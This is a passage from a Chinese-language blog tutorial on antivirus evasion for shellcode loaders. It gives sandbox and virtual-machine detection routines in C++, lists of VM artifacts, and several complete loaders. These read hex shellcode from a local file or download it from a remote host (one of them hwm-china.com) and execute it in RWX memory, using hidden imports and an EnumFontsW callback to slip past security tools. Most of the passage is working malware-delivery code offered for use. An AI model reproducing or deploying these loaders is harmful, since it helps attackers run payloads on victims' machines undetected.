timeInfo-&gt;tm_mon + 1, timeInfo-&gt;tm_mday, timeInfo-&gt;tm_hour,</span><br><span class="line">        timeInfo-&gt;tm_min, timeInfo-&gt;tm_sec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cpu数量，这里获取的是逻辑核数量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void GetCpu()</span><br><span class="line">&#123;</span><br><span class="line">    SYSTEM_INFO sysinfo;</span><br><span class="line">    GetSystemInfo(&amp;sysinfo);</span><br><span class="line">    DWORD cpunumber &#x3D; sysinfo.dwNumberOfProcessors;</span><br><span class="line">    DWORD cpumask &#x3D; sysinfo.dwActiveProcessorMask;</span><br><span class="line">    if (cpunumber &gt;&#x3D; 4) printf(&quot;[+]not vm\n&quot;); &#x2F;&#x2F; 4个逻辑内核</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; &quot;[+]cpunumber &quot; &lt;&lt; cpunumber &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;[+]cpumask &quot; &lt;&lt; cpumask &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>物理内存大小</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void GetRam()</span><br><span class="line">&#123;</span><br><span class="line">    MEMORYSTATUSEX meminfo;</span><br><span class="line">    meminfo.dwLength &#x3D; sizeof(meminfo);</span><br><span class="line">    GlobalMemoryStatusEx(&amp;meminfo);</span><br><span class="line">    DWORDLONG raminfo &#x3D; meminfo.ullTotalPhys &#x2F; 1024 &#x2F; 1024;</span><br><span class="line">    if (raminfo &gt; 3072) printf(&quot;[+]not vm\n&quot;); &#x2F;&#x2F; ram大于3G &#x3D; 1024 * 3</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; &quot;[+]ramsize &quot; &lt;&lt; raminfo &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>硬盘大小，需要管理员权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void GetDisk()</span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hDrive;</span><br><span class="line">    GET_LENGTH_INFORMATION size;</span><br><span class="line">    DWORD lpBytes;</span><br><span class="line">    </span><br><span class="line">    hDrive &#x3D; CreateFileA(&quot;\\\\.\\PhysicalDrive0&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class="line">    if (hDrive &#x3D;&#x3D; INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hDrive);</span><br><span class="line">        cout &lt;&lt; &quot;[+]无法打开该磁盘&quot; &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    DeviceIoControl(hDrive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &amp;size, sizeof(GET_LENGTH_INFORMATION), &amp;lpBytes, NULL);</span><br><span class="line">    CloseHandle(hDrive);</span><br><span class="line">    LONGLONG disksize &#x3D; size.Length.QuadPart &#x2F; 1073741824;</span><br><span class="line">    if (disksize &gt; 100) printf(&quot;[+]not vm\n&quot;);   &#x2F;&#x2F; 大于 100G</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; &quot;[+]disksize &quot; &lt;&lt; disksize &lt;&lt; &quot;G&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>样本名称，有的沙箱会重命名样本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void GetFilename()</span><br><span class="line">&#123;</span><br><span class="line">    char currentProcessPath[MAX_PATH + 1];</span><br><span class="line">    GetModuleFileName(NULL, currentProcessPath, 200);</span><br><span class="line">    if (strstr(currentProcessPath, &quot;shellcode.exe&quot;)) printf(&quot;[+]not vm\n&quot;);  &#x2F;&#x2F; 没有重名</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; &quot;[+]filename &quot; &lt;&lt; currentProcessPath &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>usb连接记录  <code>\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Enum\USBSTOR</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void GetUsb()</span><br><span class="line">&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    DWORD mountedUSBDevicesCount;</span><br><span class="line">    RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SYSTEM\\\\ControlSet001\\\\Enum\\\\USBSTOR&quot;, 0, KEY_READ, &amp;hKey);</span><br><span class="line">    RegQueryInfoKey(hKey, NULL, NULL, NULL, &amp;mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);</span><br><span class="line">    if (mountedUSBDevicesCount &gt; 1) printf(&quot;[+]not vm\n&quot;);  &#x2F;&#x2F; usb大于1</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; &quot;[+]usb &quot; &lt;&lt; mountedUSBDevicesCount &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加速检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;chrono&gt;</span><br><span class="line">#include &lt;thread&gt;</span><br><span class="line"></span><br><span class="line">bool timeSleep() &#123;</span><br><span class="line">    &#x2F;&#x2F; 记录起始时间点</span><br><span class="line">    auto start &#x3D; std::chrono::steady_clock::now();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 休眠 10 秒钟</span><br><span class="line">    std::this_thread::sleep_for(std::chrono::seconds(10));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 计算经过的时间</span><br><span class="line">    auto end &#x3D; std::chrono::steady_clock::now() - start;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 检查是否至少休眠了 10 秒钟</span><br><span class="line">    if (end &gt;&#x3D; std::chrono::seconds(10)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传参检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">    if (argc &gt;&#x3D; 3) &#123;</span><br><span class="line">        if (atoi(argv[1]) + atoi(argv[2]) &#x3D;&#x3D; 12 &amp;&amp; atoi(argv[1]) * atoi(argv[2]) &#x3D;&#x3D; 35) &#123;</span><br><span class="line">            LoadShellCode();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>路径检测，微步的沙箱貌似存在正则对抗，目录是在 <code>C:\\[A-Za-z0-9~!@#$%^&amp;*()_+=\-,.\/;&#39;\[\]\\|&#125;&#123;&quot;:?&gt;&lt;]&#123;7&#125;\\</code> 所以直接规避该路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void CheckWeibu()</span><br><span class="line">&#123;</span><br><span class="line">    char currentProcessPath[MAX_PATH + 1];</span><br><span class="line">    GetModuleFileName(NULL, currentProcessPath, MAX_PATH + 1);</span><br><span class="line">    string input(currentProcessPath);</span><br><span class="line">    regex pattern(R&quot;(C:\\[A-Za-z0-9~!@#$%^&amp;*()_+&#x3D;\-,.\&#x2F;;&#39;\[\]\\|&#125;&#123;&quot;:?&gt;&lt;]&#123;7&#125;\\shellcode\.exe)&quot;);</span><br><span class="line">    smatch matches;</span><br><span class="line">    &#x2F;&#x2F; 符合微步路径</span><br><span class="line">    if (!strstr(currentProcessPath, &quot;Windows&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        if (regex_search(input, matches, pattern)) MessageBox(0, &quot;in weibu&quot;, &quot;Caption&quot;, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; &quot;[+]path &quot; &lt;&lt; currentProcessPath &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>命名管道通信</p>
<p>暂时挖坑，<a target="_blank" rel="noopener" href="https://drootkit.github.io/MyArticles/CyberSec/%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%94%B6%E9%9B%86.html">免杀手法收集</a></p>
<h2 id="调试-虚拟机"><a href="#调试-虚拟机" class="headerlink" title="调试/虚拟机"></a>调试/虚拟机</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mBOfkXm-irfpNZ5PoIOe_w">浅谈反沙箱、反调试技术</a>，这块简单记录下，毕竟是搞免杀的，又不是搞APT的。</p>
<p>可能存在的进程名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Vmtoolsd.exe</span><br><span class="line">Vmwaretrat.exe</span><br><span class="line">Vmwareuser.exe</span><br><span class="line">Vmacthlp.exe</span><br><span class="line">vboxservice.exe</span><br><span class="line">vboxtray.exe</span><br></pre></td></tr></table></figure>

<p>注册表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKLM\SOFTWARE\Vmware Inc\Vmware Tools</span><br><span class="line">HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier</span><br><span class="line">HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions</span><br></pre></td></tr></table></figure>

<p>硬盘文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\windows\System32\Drivers\Vmmouse.sys</span><br><span class="line">C:\windows\System32\Drivers\vmtray.dll</span><br><span class="line">C:\windows\System32\Drivers\VMToolsHook.dll</span><br><span class="line">C:\windows\System32\Drivers\vmmousever.dll</span><br><span class="line">C:\windows\System32\Drivers\vmhgfs.dll</span><br><span class="line">C:\windows\System32\Drivers\vmGuestLib.dll</span><br><span class="line"></span><br><span class="line">C:\windows\System32\Drivers\VBoxMouse.sys</span><br><span class="line">C:\windows\System32\Drivers\VBoxGuest.sys</span><br><span class="line">C:\windows\System32\Drivers\VBoxSF.sys</span><br><span class="line">C:\windows\System32\Drivers\VBoxVideo.sys</span><br><span class="line">C:\windows\System32\vboxdisp.dll</span><br><span class="line">C:\windows\System32\vboxhook.dll</span><br><span class="line">C:\windows\System32\vboxoglerrorspu.dll</span><br><span class="line">C:\windows\System32\vboxoglpassthroughspu.dll</span><br><span class="line">C:\windows\System32\vboxservice.exe</span><br><span class="line">C:\windows\System32\vboxtray.exe</span><br><span class="line">C:\windows\System32\VBoxControl.exe</span><br></pre></td></tr></table></figure>

<p>服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VMTools</span><br><span class="line">Vmrawdsk</span><br><span class="line">Vmusbmouse</span><br><span class="line">Vmvss</span><br><span class="line">Vmscsi</span><br><span class="line">Vmxnet</span><br><span class="line">vmx_svga</span><br><span class="line">Vmware Tools</span><br></pre></td></tr></table></figure>

<p>MAC前缀</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00:05:69 (Vmware)</span><br><span class="line">00:0C:29 (Vmware)</span><br><span class="line">00:1C:14 (Vmware)</span><br><span class="line">00:50:56 (Vmware)</span><br><span class="line">08:00:27 (VirtualBox)</span><br></pre></td></tr></table></figure>



<h1 id="分离静态免杀"><a href="#分离静态免杀" class="headerlink" title="分离静态免杀"></a>分离静态免杀</h1><p>这里shellcode用的是hex类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fc4883e4f0e8c00000004151415052515648...</span><br></pre></td></tr></table></figure>

<h2 id="本地读取"><a href="#本地读取" class="headerlink" title="本地读取"></a>本地读取</h2><p>本地文件读取shellcode -&gt; 分配内存 -&gt; 内存执行，肯定要搭配其他手法，比如shellcode加密、动态API调用。</p>
<p>静态免杀版，用的 lazy_importer 项目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &quot;lazy_importer.hpp&quot;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line"></span><br><span class="line">unsigned char hexCharToByte(char character) &#123;</span><br><span class="line">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class="line">        return character - &#39;0&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class="line">        return character - &#39;a&#39; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class="line">        return character - &#39;A&#39; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hexStringToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class="line">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    ifstream ifs;</span><br><span class="line">    ifs.open(&quot;sss.txt&quot;, ios::in);</span><br><span class="line">    if (!ifs.is_open()) &#123; cout &lt;&lt; &quot;[-]open fail&quot; &lt;&lt; endl; return -1; &#125;</span><br><span class="line">    </span><br><span class="line">    string line;</span><br><span class="line">    getline(ifs, line);</span><br><span class="line">    ifs.close();</span><br><span class="line"></span><br><span class="line">    const size_t length &#x3D; line.length() &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class="line">    unsigned char* buffer &#x3D; (unsigned char*)malloc(length);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class="line">    hexStringToBytes(line, buffer, length);</span><br><span class="line">    char* exec &#x3D; (char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(exec, buffer, length);</span><br><span class="line">    ((void(*) ())exec)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外在测试时候，发现代码顺序竟然影响免杀效果。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505180337646.png" alt="image-20240505180337646"></p>
<h2 id="远程加载"><a href="#远程加载" class="headerlink" title="远程加载"></a>远程加载</h2><p>三种建立http/https的连接方法</p>
<ol>
<li>winnet</li>
<li>winhttp</li>
<li>socket</li>
</ol>
<p>winnet</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;wininet.h&gt;</span><br><span class="line">#pragma comment(lib, &quot;wininet.lib&quot;)</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line">#include &lt;sstream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &quot;lazy_importer.hpp&quot;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将十六进制中的单个字符转换为相应的整数值</span><br><span class="line">unsigned char hexCharToByte(char character) &#123;</span><br><span class="line">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class="line">        return character - &#39;0&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class="line">        return character - &#39;a&#39; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class="line">        return character - &#39;A&#39; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将十六进制字符串转换成字节型数组</span><br><span class="line">void hexStringToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class="line">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">size_t GetUrl_HexContent(LPSTR url, std::vector&lt;unsigned char&gt;&amp; buffer) &#123;</span><br><span class="line">    HINTERNET hInternet, hConnect;</span><br><span class="line">    DWORD bytesRead;</span><br><span class="line">    DWORD bufferSize &#x3D; 0;</span><br><span class="line">    DWORD contentLength &#x3D; 0;</span><br><span class="line">    DWORD index &#x3D; 0;</span><br><span class="line">    DWORD bufferLength &#x3D; sizeof(bufferSize);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 打开一个与互联网的连接</span><br><span class="line">    hInternet &#x3D; InternetOpen(L&quot;User Agent&quot;, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);</span><br><span class="line">    if (hInternet &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">        std::cerr &lt;&lt; &quot;InternetOpen failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 打开一个URL连接</span><br><span class="line">    hConnect &#x3D; InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);</span><br><span class="line">    if (hConnect &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">        std::cerr &lt;&lt; &quot;InternetOpenUrlA failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">        InternetCloseHandle(hInternet);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 查询HTTP响应头中的内容长度</span><br><span class="line">    HttpQueryInfo(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &amp;contentLength, &amp;bufferLength, &amp;index);</span><br><span class="line">    std::vector&lt;char&gt; hexBuffer(contentLength + 1, 0);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 读取URL返回的内容到hexBuffer中</span><br><span class="line">    if (!InternetReadFile(hConnect, &amp;hexBuffer[0], contentLength, &amp;bytesRead)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; &quot;InternetReadFile failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (bytesRead &gt; 0) &#123;</span><br><span class="line">        hexBuffer[bytesRead] &#x3D; &#39;\0&#39;;</span><br><span class="line">        &#x2F;&#x2F; 调整buffer的大小，以便存储转换后的字节数据</span><br><span class="line">        buffer.resize(bytesRead &#x2F; 2);</span><br><span class="line">        &#x2F;&#x2F; 将十六进制字符串转换为字节型数组</span><br><span class="line">        hexStringToBytes(&amp;hexBuffer[0], &amp;buffer[0], bytesRead &#x2F; 2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InternetCloseHandle(hConnect);</span><br><span class="line">    InternetCloseHandle(hInternet);</span><br><span class="line">    return bytesRead &#x2F; 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    LPSTR url &#x3D; (char*)&quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;shellcode_hex.txt&quot;; </span><br><span class="line">    std::vector&lt;unsigned char&gt; buffer;</span><br><span class="line">    size_t size &#x3D; GetUrl_HexContent(url, buffer);</span><br><span class="line">    char* exec &#x3D; (char*)LI_FN(VirtualAlloc)(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(exec, buffer.data(), size);</span><br><span class="line">    ((void(*) ())exec)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>socket静态免杀版，同样使用 lazy_importer </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;lazy_importer.hpp&quot;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">#pragma comment(lib, &quot;ws2_32.lib&quot;)</span><br><span class="line">#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line"></span><br><span class="line">char* readUrl(const char* szUrl, long&amp; fileSize)</span><br><span class="line">&#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) !&#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        cerr &lt;&lt; &quot;WSAStartup failed.&quot; &lt;&lt; endl;</span><br><span class="line">        return nullptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    string server, filepath;</span><br><span class="line">    size_t pos &#x3D; string(szUrl).find(&quot;:&#x2F;&#x2F;&quot;);</span><br><span class="line">    if (pos !&#x3D; string::npos)</span><br><span class="line">    &#123;</span><br><span class="line">        string url &#x3D; string(szUrl).substr(pos + 3);</span><br><span class="line">        pos &#x3D; url.find(&#39;&#x2F;&#39;);</span><br><span class="line">        server &#x3D; url.substr(0, pos);</span><br><span class="line">        filepath &#x3D; (pos !&#x3D; string::npos) ? url.substr(pos) : &quot;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SOCKET conn &#x3D; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    if (conn &#x3D;&#x3D; INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        WSACleanup();</span><br><span class="line">        return nullptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct hostent* hp &#x3D; gethostbyname(server.c_str());</span><br><span class="line">    if (hp &#x3D;&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(conn);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        return nullptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct sockaddr_in serverAddr;</span><br><span class="line">    memset(&amp;serverAddr, 0, sizeof(serverAddr));</span><br><span class="line">    serverAddr.sin_family &#x3D; AF_INET;</span><br><span class="line">    serverAddr.sin_port &#x3D; htons(80);</span><br><span class="line">    memcpy(&amp;serverAddr.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);</span><br><span class="line"></span><br><span class="line">    if (connect(conn, (struct sockaddr*)&amp;serverAddr, sizeof(serverAddr)) &#x3D;&#x3D; SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(conn);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        return nullptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    string getRequest &#x3D; &quot;GET &quot; + filepath + &quot; HTTP&#x2F;1.0\r\nHost: &quot; + server + &quot;\r\n\r\n&quot;;</span><br><span class="line">    if (send(conn, getRequest.c_str(), getRequest.length(), 0) &#x3D;&#x3D; SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(conn);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        return nullptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char readBuffer[512];</span><br><span class="line">    string responseData;</span><br><span class="line">    while (true)</span><br><span class="line">    &#123;</span><br><span class="line">        int bytesRead &#x3D; recv(conn, readBuffer, sizeof(readBuffer), 0);</span><br><span class="line">        if (bytesRead &lt;&#x3D; 0)</span><br><span class="line">            break;</span><br><span class="line">        responseData.append(readBuffer, bytesRead);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int headerEndPos &#x3D; responseData.find(&quot;\r\n\r\n&quot;);</span><br><span class="line">    if (headerEndPos &#x3D;&#x3D; string::npos)</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(conn);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        return nullptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fileSize &#x3D; responseData.length() - headerEndPos - 4;</span><br><span class="line">    char* result &#x3D; new char[fileSize + 1];</span><br><span class="line">    memcpy(result, responseData.c_str() + headerEndPos + 4, fileSize);</span><br><span class="line">    result[fileSize] &#x3D; &#39;\0&#39;;</span><br><span class="line"></span><br><span class="line">    closesocket(conn);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const char* concat(const char* str1, const char* str2) &#123;</span><br><span class="line">    size_t len1 &#x3D; strlen(str1);</span><br><span class="line">    size_t len2 &#x3D; strlen(str2);</span><br><span class="line">    size_t len_total &#x3D; len1 + len2;</span><br><span class="line">    char* result &#x3D; new char[len_total + 1];</span><br><span class="line">    memcpy(result, str1, len1);</span><br><span class="line">    memcpy(result + len1, str2, len2);</span><br><span class="line">    result[len_total] &#x3D; &#39;\0&#39;;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned char hexCharToByte(char character) &#123;</span><br><span class="line">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class="line">        return character - &#39;0&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class="line">        return character - &#39;a&#39; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class="line">        return character - &#39;A&#39; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hexStringToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class="line">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    const char* str1 &#x3D; &quot;http&quot;;</span><br><span class="line">    const char* str2 &#x3D; &quot;:&#x2F;&#x2F;hwm-china.com&#x2F;ssss.txt&quot;;</span><br><span class="line"></span><br><span class="line">    const char* szUrl &#x3D; concat(str1, str2);</span><br><span class="line">    long fileSize;</span><br><span class="line">    string data &#x3D; readUrl(szUrl, fileSize);</span><br><span class="line"></span><br><span class="line">    const size_t length &#x3D; data.size() &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class="line"></span><br><span class="line">    unsigned char* exec &#x3D; (unsigned char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class="line">    hexStringToBytes(data, exec, length);</span><br><span class="line">    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)exec, NULL);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505214645485.png" alt="image-20240505214645485"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240507110929004.png" alt="image-20240507110929004"></p>
<h2 id="资源释放"><a href="#资源释放" class="headerlink" title="资源释放"></a>资源释放</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mykr3/p/17905122.html">免杀-绕过静态动态查杀 - mykr3</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jTpAnS6MzARafKfMMdP_wA">某0资源释放免杀</a></p>
<p>就是往项目资源里添加东西，然后释放资源，再做个shellcode loader</p>
<p>右键项目-&gt;添加-&gt;资源-&gt;导入-&gt;选择要导入的shellcode或者raw文件。这里用的calc的shellcode测试</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240506235315824.png" alt="image-20240506235315824"></p>
<p>加个rc4</p>
